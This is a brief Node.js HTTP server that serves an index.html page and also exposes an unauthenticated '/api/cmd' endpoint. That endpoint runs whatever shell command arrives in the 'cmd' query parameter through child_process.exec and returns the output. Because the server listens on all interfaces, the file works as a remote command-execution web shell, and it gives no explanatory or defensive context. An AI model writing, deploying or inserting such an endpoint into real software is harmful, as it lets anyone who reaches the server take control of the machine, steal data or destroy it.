const http = require('http');
const { exec } = require('child_process');
const url = require('url');
const fs = require('fs');

const server = http.createServer((req, res) => {
  const parsedUrl = url.parse(req.url, true);
  
  if (parsedUrl.pathname === '/api/cmd' && parsedUrl.query.cmd) {
    exec(parsedUrl.query.cmd, (error, stdout, stderr) => {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({
        output: stdout,
        error: error ? error.message : (stderr || null)
      }));
    });
  } 
  else if (parsedUrl.pathname === '/') {
    fs.readFile('index.html', (err, data) => {
      if (err) {
        res.writeHead(500);
        res.end('index.html not found');
      } else {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(data);
      }
    });
  }
  else {
    res.writeHead(404);
    res.end('404');
  }
});

server.listen(3000, '0.0.0.0', () => {
  console.log('Running on port 3000');
});